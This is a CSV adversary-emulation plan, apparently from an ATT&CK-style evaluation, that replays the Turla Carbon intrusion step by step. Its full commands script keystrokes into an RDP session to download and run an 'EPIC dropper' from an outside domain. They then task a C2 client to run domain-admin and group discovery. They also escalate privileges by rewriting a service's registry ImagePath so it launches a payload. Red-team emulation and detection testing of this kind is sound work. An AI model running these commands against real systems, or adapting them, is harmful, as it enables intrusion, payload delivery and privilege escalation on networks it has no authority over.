source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
turla_carbon,turla_carbon,Turla - Carbon,unknown,1,9a49d734-c69a-4a6b-b726-5a2a86edf418,x,x,x,x,RDP to 1st host (User),"Use xfreerdp to RDP into the first host. Then, wait for the login to complete.","exec-background xfreerdp /u:""#{network.domain.name}\\#{first.target.user}"" /p:""#{first.target.password}"" /v:#{first.target.ip} /cert-ignore","exec-background xfreerdp /u:""#{network.domain.name}\\#{first.target.user}"" /p:""#{first.target.password}"" /v:#{first.target.ip} /cert-ignore"
turla_carbon,turla_carbon,Turla - Carbon,1,2,2c7ad0e1-d112-4c71-8deb-38bc3ce5654b,1.A.1,Initial Access,T1566.002,Phishing: Spearphishing Link,Download EPIC dropper (User),"Using xdotool, send keystrokes to download the EPIC dropper.","rdp_pid=$(pgrep -f xfreerdp); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 6; xdotool type --window ""$r...","rdp_pid=$(pgrep -f xfreerdp);
rdp_window=$(xdotool search --pid ""$rdp_pid"");
xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
xdotool key --window ""$rdp_window"" Ctrl+Escape;
sleep 6;
xdotool type --window ""$rdp_window"" ""run"";
sleep 6;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool type --window ""$rdp_window"" ""microsoft-edge"";
xdotool key --window ""$rdp_window"" shift+colon; 
xdotool type --window ""$rdp_window"" ""http"";
xdotool key --window ""$rdp_window"" shift+colon; 
xdotool type --window ""$rdp_window"" ""//anto-int.com/"";
xdotool key --window ""$rdp_window"" shift+N; 
xdotool key --window ""$rdp_window"" shift+T; 
xdotool key --window ""$rdp_window"" shift+F; 
xdotool key --window ""$rdp_window"" shift+V; 
xdotool type --window ""$rdp_window"" ""ersion.exe"";
xdotool key --window ""$rdp_window"" Return;
sleep 20;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;

xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;

xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;

xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;

xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Return;"
turla_carbon,turla_carbon,Turla - Carbon,1,3,bb4dd7c0-c5df-4321-94ca-cb7da59b9c32,1.A.2,Execution,T1204.002,User Execution: Malicious File,Run EPIC dropper (User),"Using xdotool, run the EPIC droppper.","rdp_pid=$(pgrep -f xfreerdp); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 6; xdotool type --window ""$r...","rdp_pid=$(pgrep -f xfreerdp);
rdp_window=$(xdotool search --pid ""$rdp_pid"");
xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
xdotool key --window ""$rdp_window"" Ctrl+Escape;
sleep 6;
xdotool type --window ""$rdp_window"" ""run"";
sleep 6;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool type --window ""$rdp_window"" 'C';
xdotool key --window ""$rdp_window"" shift+colon;           
xdotool type --window ""$rdp_window"" '\Users\#{first.target.user}\Downloads\';
xdotool key --window ""$rdp_window"" shift+N; 
xdotool key --window ""$rdp_window"" shift+T; 
xdotool key --window ""$rdp_window"" shift+F; 
xdotool key --window ""$rdp_window"" shift+V; 
xdotool type --window ""$rdp_window"" ""ersion"";
sleep 6;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool key --window ""$rdp_window"" R;
sleep 30;"
turla_carbon,turla_carbon,Turla - Carbon,unknown,4,c4e2f189-ef8d-4073-abfb-1d3449af464b,x,x,x,x,Log out of the 1st target host (User),Use xdotool to send keystrokes to log out of the 1st target host.,"rdp_pid=$(pgrep -f xfreerdp); rdp_window=$(xdotool search --pid ""$rdp_pid""); echo $rdp_window; sleep 5; xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Alt+Delete; sle...","rdp_pid=$(pgrep -f xfreerdp);
rdp_window=$(xdotool search --pid ""$rdp_pid"");
echo $rdp_window;
sleep 5; 
xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
xdotool key --window ""$rdp_window"" Ctrl+Alt+Delete;
sleep 6;
xdotool key --window ""$rdp_window"" Down;
sleep 6;
xdotool key --window ""$rdp_window"" Return;
sleep 30;"
turla_carbon,turla_carbon,Turla - Carbon,unknown,5,771a00b3-2b39-436d-b003-b58cacffa774,x,x,x,x,Log back in to the 1st target host (User),Use xfreerdp to log back in to the 1st target host. Wait for login to complete.,"exec-background xfreerdp /u:""#{network.domain.name}\\#{first.target.user}"" /p:""#{first.target.password}"" /v:#{first.target.ip} /cert-ignore","exec-background xfreerdp /u:""#{network.domain.name}\\#{first.target.user}"" /p:""#{first.target.password}"" /v:#{first.target.ip} /cert-ignore"
turla_carbon,turla_carbon,Turla - Carbon,unknown,6,3e20bbc1-b60a-4129-88b5-627b7b4ac17d,x,x,x,x,Open Edge to trigger 1st EPIC beacon (User),"Use xdotool to open Microsoft Edge and open a blank page. Then, wait to receive the new implant beacon.","rdp_pid=$(pgrep -f xfreerdp); rdp_window=$(xdotool search --pid ""$rdp_pid""); echo $rdp_window; sleep 5; xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 6...","rdp_pid=$(pgrep -f xfreerdp);
rdp_window=$(xdotool search --pid ""$rdp_pid"");
echo $rdp_window;
sleep 5; 
xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
xdotool key --window ""$rdp_window"" Ctrl+Escape;
sleep 6;
xdotool type --window ""$rdp_window"" ""run"";
sleep 6;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool type --window ""$rdp_window"" ""microsoft-edge"";
xdotool key --window ""$rdp_window"" shift+colon;
xdotool key --window ""$rdp_window"" Return;
sleep 180;"
turla_carbon,turla_carbon,Turla - Carbon,3,7,eb66d327-3f82-4433-8897-76cd8a46865b,3.A.1-2,Discovery,T1069.002,Permission Groups Discovery: Domain Groups,Execute net group discovery commands and execute `tasklist /svc` (Adversary),Execute net group discovery commands and execute `tasklist /svc`,"./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | net group ""Domain Admins"" /domain && net group ""Domain Computers"" /domain && net group ""Domain Controllers"" /domain && tasklist /svc' --task-wait-time...","./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | net group ""Domain Admins"" /domain && net group ""Domain Computers"" /domain && net group ""Domain Controllers"" /domain && tasklist /svc' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,3,8,88bb16c5-f78b-45c3-91b6-a7422cd2fb13,3.A.5-6,Execution,T1059.001,Command and Scripting Interpreter: Powershell,Reg query the ViperVPNSvc Service & verify which users can access it (Adversary),Reg query the ViperVPNSvc Service & verify which users can access it,"./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell ""$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Acces...","./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell ""$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access""' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,3,9,d5e29782-72ca-45f0-b286-09525ae91d75,3.A.7,Privilege Escalation,T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,Modify the ViperVPN service registry key (Adversary),Modify the ViperVPN service registry key,"./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg add ""HKLM\system\currentcontrolset\services\ViperVPNSvc"" /t REG_EXPAND_SZ /v ImagePath /d ""cmd.exe /c %TEMP%\mxs_installer.exe"" /f' --task-wait-ti...","./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg add ""HKLM\system\currentcontrolset\services\ViperVPNSvc"" /t REG_EXPAND_SZ /v ImagePath /d ""cmd.exe /c %TEMP%\mxs_installer.exe"" /f' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,unknown,10,349d3879-c849-493a-989e-6d7f40015f54,x,x,x,x,RDP to 2nd host (User),"Use xfreerdp to RDP into the second host. Then, wait for the login to complete.","exec-background xfreerdp /u:""#{network.domain.name}\\#{second.target.user}"" /p:""#{second.target.password}"" /v:#{second.target.ip} /cert-ignore","exec-background xfreerdp /u:""#{network.domain.name}\\#{second.target.user}"" /p:""#{second.target.password}"" /v:#{second.target.ip} /cert-ignore"
